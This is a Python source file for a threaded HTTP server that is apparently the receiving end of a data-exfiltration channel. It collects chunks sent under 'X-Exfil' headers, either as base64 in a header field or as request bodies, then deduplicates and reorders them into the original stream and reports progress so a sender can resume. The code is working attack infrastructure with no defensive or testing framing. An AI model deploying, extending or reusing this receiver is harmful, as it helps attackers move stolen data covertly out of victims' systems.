from __future__ import annotations
from typing import Iterator, Tuple
import threading, queue, time

from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler

class _Store:
    def __init__(self) -> None:
        self.queues: dict[str, "queue.PriorityQueue[Tuple[int, bytes]]"] = {}
        self.done: dict[str, bool] = {}
        self.received: dict[str, set[int]] = {}
        self.next_expected: dict[str, int] = {}
        self.lock = threading.Lock()

    def push(self, exfil_id: str, seq: int, data: bytes) -> None:
        with self.lock:
            if exfil_id not in self.queues:
                self.queues[exfil_id] = queue.PriorityQueue()
                self.done[exfil_id] = False
                self.received[exfil_id] = set()
                self.next_expected[exfil_id] = 0
            # Evitar duplicados
            if seq in self.received[exfil_id]:
                return
            self.received[exfil_id].add(seq)
            self.queues[exfil_id].put((seq, data))
            # Actualizar siguiente esperado
            ne = self.next_expected[exfil_id]
            while ne in self.received[exfil_id]:
                ne += 1
            self.next_expected[exfil_id] = ne

    def mark_done(self, exfil_id: str) -> None:
        with self.lock:
            self.done[exfil_id] = True

    def is_done(self, exfil_id: str) -> bool:
        with self.lock:
            return self.done.get(exfil_id, False)

    def get_next_seq(self, exfil_id: str) -> int:
        with self.lock:
            return int(self.next_expected.get(exfil_id, 0))

    def pop_iter(self, exfil_id: str) -> Iterator[bytes]:
        buf_seq = 0
        buffer: dict[int, bytes] = {}
        pq = None
        while True:
            with self.lock:
                pq = self.queues.get(exfil_id)
            if pq is None:
                time.sleep(0.05); continue
            try:
                while True:
                    seq, data = pq.get(timeout=0.5)
                    buffer[seq] = data
                    if self.is_done(exfil_id) and pq.empty():
                        break
            except Exception:
                pass
            while buf_seq in buffer:
                yield buffer.pop(buf_seq)
                buf_seq += 1
            if self.is_done(exfil_id) and not buffer and pq.empty():
                break

def _auth_ok(req: BaseHTTPRequestHandler, auth_token: str | None) -> bool:
    if not auth_token:
        return True
    provided = req.headers.get("X-Auth-Token")
    return provided == auth_token

def _make_handler_headers(store: _Store, path: str, auth_token: str | None):
    class H(BaseHTTPRequestHandler):
        def do_HEAD(self):
            # Status probe
            if self.path != path:
                self.send_response(404); self.end_headers(); return
            if not _auth_ok(self, auth_token):
                self.send_response(401); self.end_headers(); return
            if self.headers.get("X-Exfil-Status") == "1":
                exfil_id = self.headers.get("X-Exfil-Id") or "default"
                next_seq = store.get_next_seq(exfil_id)
                self.send_response(200)
                self.send_header("X-Exfil-Next-Seq", str(next_seq))
                self.send_header("X-Exfil-Done", "1" if store.is_done(exfil_id) else "0")
                self.end_headers()
                return
            self.send_response(200); self.end_headers()

        def do_POST(self):
            if self.path != path:
                self.send_response(404); self.end_headers(); return
            if not _auth_ok(self, auth_token):
                self.send_response(401); self.end_headers(); return
            exfil_id = self.headers.get("X-Exfil-Id") or "default"
            seq = int(self.headers.get("X-Exfil-Seq") or "0")
            last = self.headers.get("X-Exfil-Last") == "1"
            xdata = self.headers.get("X-Exfil-Data")
            data = b""
            if xdata:
                import base64
                data = base64.b64decode(xdata)
            store.push(exfil_id, seq, data)
            if last:
                store.mark_done(exfil_id)
            self.send_response(200); self.end_headers()
    return H

def _make_handler_verbs(store: _Store, path: str, auth_token: str | None):
    class H(BaseHTTPRequestHandler):
        def do_POST(self): self._handle("POST")
        def do_PUT(self): self._handle("PUT")
        def do_HEAD(self): self._handle("HEAD")
        def _handle(self, method: str):
            if self.path != path:
                self.send_response(404); self.end_headers(); return
            if not _auth_ok(self, auth_token):
                self.send_response(401); self.end_headers(); return
            exfil_id = self.headers.get("X-Exfil-Id") or "default"
            if method == "HEAD" and self.headers.get("X-Exfil-Status") == "1":
                next_seq = store.get_next_seq(exfil_id)
                self.send_response(200)
                self.send_header("X-Exfil-Next-Seq", str(next_seq))
                self.send_header("X-Exfil-Done", "1" if store.is_done(exfil_id) else "0")
                self.end_headers()
                return
            seq = int(self.headers.get("X-Exfil-Seq") or "0")
            last = self.headers.get("X-Exfil-Last") == "1"
            if method in ("POST","PUT"):
                length = int(self.headers.get("Content-Length") or "0")
                data = self.rfile.read(length) if length > 0 else b""
                store.push(exfil_id, seq, data)
            if last:
                store.mark_done(exfil_id)
            self.send_response(200); self.end_headers()
    return H
